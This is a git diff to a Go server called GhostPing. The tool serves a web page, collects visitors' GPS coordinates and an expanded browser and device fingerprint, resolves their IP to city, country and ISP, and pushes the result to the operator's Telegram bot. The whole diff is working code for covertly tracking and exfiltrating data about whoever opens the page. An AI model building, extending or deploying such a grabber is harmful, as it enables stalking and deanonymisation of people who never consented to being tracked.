@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"time"
 )
 
 type IPInfo struct {
@@ -19,15 +20,29 @@ type IPInfo struct {
 	ISP     string `json:"isp"`
 }
 
-type LocationRequest struct {
-	Latitude  float64 `json:"latitude"`
-	Longitude float64 `json:"longitude"`
+type ClientData struct {
+	Latitude    float64 `json:"latitude"`
+	Longitude   float64 `json:"longitude"`
+	UserAgent   string  `json:"userAgent"`
+	Language    string  `json:"language"`
+	TimeZone    string  `json:"timeZone"`
+	ScreenRes   string  `json:"screenRes"`
+	DeviceRatio float64 `json:"deviceRatio"`
+	Platform    string  `json:"platform"`
+	Battery     string  `json:"battery"`
+	Connection  string  `json:"connection"`
+	CPUCores    int     `json:"cpuCores"`
+	MemoryGB    float64 `json:"memoryGB"`
+	Cookies     bool    `json:"cookies"`
+	Plugins     string  `json:"plugins"`
+	TouchPoints int     `json:"touchPoints"`
 }
 
 type TelegramMessage struct {
-	ChatID    string `json:"chat_id"`
-	Text      string `json:"text"`
-	ParseMode string `json:"parse_mode"`
+	ChatID                string `json:"chat_id"`
+	Text                  string `json:"text"`
+	ParseMode             string `json:"parse_mode,omitempty"`     // deixamos vazio
+	DisableWebPagePreview bool   `json:"disable_web_page_preview"` // evita preview gigante
 }
 
 var (
@@ -35,6 +50,7 @@ var (
 	chatID   string
 	port     int
 	help     bool
+	httpCli  *http.Client
 )
 
 func init() {
@@ -43,38 +59,12 @@ func init() {
 	flag.IntVar(&port, "port", 8088, "Port to run the server")
 	flag.BoolVar(&help, "h", false, "Show usage")
 	flag.BoolVar(&help, "help", false, "Show usage (alias)")
+
+	httpCli = &http.Client{Timeout: 15 * time.Second}
 }
 
 func usage() {
-	fmt.Println("\033[32m" + `
- @@@@@@@@  @@@  @@@   @@@@@@    @@@@@@   @@@@@@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@  
-@@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@  
-!@@        @@!  @@@  @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@!@!@@@  !@@        
-!@!        !@!  @!@  !@!  @!@  !@!         !@!    !@!  @!@  !@!  !@!!@!@!  !@!        
-!@! @!@!@  @!@!@!@!  @!@  !@!  !!@@!!      @!!    @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
-!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!     !!!    !!@!!!    !!!  !@!  !!!  !!! !!@!!  
-:!!   !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!:  !!:  !!!  :!!   !!:  
-:!:   !::  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  :!:  !:!  :!:   !::  
- ::: ::::  ::   :::  ::::: ::  :::: ::      ::     ::        ::   ::   ::   ::: ::::  
- :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :   
-                                                                                      
-       by k4rkarov (v1.0)
-` + "\033[0m")
-	fmt.Println("")
-	fmt.Println("Usage: ghostping [options]")
-	fmt.Println("")
-	fmt.Println("Options:")
-	fmt.Println("  -token <TOKEN>   Telegram bot token (required)")
-	fmt.Println("  -chat <CHAT_ID>  Telegram chat ID (required)")
-	fmt.Println("  -port <PORT>     Port to run the server (default: 8088)")
-	fmt.Println("  -h, --help       Show this help message")
-	fmt.Println("")
-	fmt.Println("Description:")
-	fmt.Println("	GhostPing listens for POST requests on /send-location.")
-	fmt.Println("	It extracts latitude and longitude from the JSON body,")
-	fmt.Println("	resolves the client’s IP into city/country/ISP details,")
-	fmt.Println("	then pushes a formatted message to your Telegram bot.")
-	fmt.Println("")
+	fmt.Println("GhostPing usage: ghostping -token <TOKEN> -chat <CHAT_ID> [-port 8088]")
 }
 
 func getIP(r *http.Request) string {
@@ -94,7 +84,7 @@ func getIP(r *http.Request) string {
 }
 
 func enrichIP(ip string) (*IPInfo, error) {
-	resp, err := http.Get("http://ip-api.com/json/" + ip)
+	resp, err := httpCli.Get("http://ip-api.com/json/" + ip)
 	if err != nil {
 		return nil, err
 	}
@@ -111,7 +101,7 @@ func enrichIP(ip string) (*IPInfo, error) {
 func sendToTelegram(msg TelegramMessage, token string) error {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
 	jsonMsg, _ := json.Marshal(msg)
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonMsg))
+	resp, err := httpCli.Post(url, "application/json", bytes.NewBuffer(jsonMsg))
 	if err != nil {
 		return err
 	}
@@ -119,7 +109,7 @@ func sendToTelegram(msg TelegramMessage, token string) error {
 
 	if resp.StatusCode != http.StatusOK {
 		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("Telegram API error: %s", string(body))
+		return fmt.Errorf("Telegram API error (%d): %s", resp.StatusCode, string(body))
 	}
 	return nil
 }
@@ -130,8 +120,14 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var loc LocationRequest
-	if err := json.NewDecoder(r.Body).Decode(&loc); err != nil {
+	// log do corpo bruto pra depurar JSON
+	body, _ := io.ReadAll(r.Body)
+	log.Println("RAW BODY:", string(body))
+	r.Body = io.NopCloser(bytes.NewBuffer(body))
+
+	var data ClientData
+	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+		log.Printf("JSON decode error: %v", err)
 		http.Error(w, "Invalid request body", http.StatusBadRequest)
 		return
 	}
@@ -143,38 +139,67 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		ipInfo = &IPInfo{}
 	}
 
-	mapsLink := fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%f,%f)", loc.Latitude, loc.Longitude)
+	// link puro, sem Markdown
+	mapsURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", data.Latitude, data.Longitude)
 
-	message := fmt.Sprintf(`
-📍 *Location Received:*
-Latitude: %f
-Longitude: %f
+	message := fmt.Sprintf(
+		`📍 Location
+Lat: %f
+Lon: %f
 
-🌐 *IP:* %s
-🏙 *City:* %s
-🏳 *Country:* %s
-📡 *ISP:* %s
+🌐 Network
+IP: %s
+City: %s
+Country: %s
+ISP: %s
 
-🔗 %s
-`,
-		loc.Latitude,
-		loc.Longitude,
+🖥 Device
+User-Agent: %s
+Language: %s
+Timezone: %s
+Screen: %s
+DPR: %.2f
+Platform: %s
+Battery: %s
+Connection: %s
+CPU Cores: %d
+Memory: %.1f GB
+Cookies Enabled: %t
+Plugins: %s
+Touch Points: %d
+
+🔗 Maps: %s`,
+		data.Latitude, data.Longitude,
 		ip,
 		emptyIf(ipInfo.City, "N/A"),
 		emptyIf(ipInfo.Country, "N/A"),
 		emptyIf(ipInfo.ISP, "N/A"),
-		mapsLink,
+		data.UserAgent,
+		data.Language,
+		data.TimeZone,
+		data.ScreenRes,
+		data.DeviceRatio,
+		data.Platform,
+		data.Battery,
+		data.Connection,
+		data.CPUCores,
+		data.MemoryGB,
+		data.Cookies,
+		data.Plugins,
+		data.TouchPoints,
+		mapsURL,
 	)
 
 	msg := TelegramMessage{
-		ChatID:    chatID,
-		Text:      message,
-		ParseMode: "Markdown",
+		ChatID:                chatID,
+		Text:                  message,
+		DisableWebPagePreview: true,
+		// ParseMode vazio para não quebrar com caracteres especiais
 	}
 
 	if err := sendToTelegram(msg, botToken); err != nil {
 		log.Printf("Error sending to Telegram: %v", err)
-		http.Error(w, "Failed to send message", http.StatusInternalServerError)
+		http.Error(w, "Failed to send message to Telegram", http.StatusInternalServerError)
 		return
 	}
 
@@ -183,7 +208,7 @@ Longitude: %f
 }
 
 func emptyIf(val, def string) string {
-	if val == "" {
+	if strings.TrimSpace(val) == "" {
 		return def
 	}
 	return val
@@ -193,8 +218,8 @@ func main() {
 	flag.Parse()
 
 	if len(os.Args) == 1 {
-		fmt.Println("\033[31mError: no parameters provided\033[0m")
-		fmt.Println("Please check: ghostping -h/--help")
+		fmt.Println("Error: no parameters provided")
+		usage()
 		os.Exit(1)
 	}
 
@@ -204,12 +229,12 @@ func main() {
 	}
 
 	if botToken == "" || chatID == "" {
-		fmt.Println("\033[31mError: -token and -chat are required\033[0m")
+		fmt.Println("Error: -token and -chat are required")
 		usage()
 		os.Exit(1)
 	}
 
-	// Servir a página HTML
+	// servir /public
 	http.Handle("/", http.FileServer(http.Dir("public")))
 	http.HandleFunc("/send-location", sendLocationHandler)
 
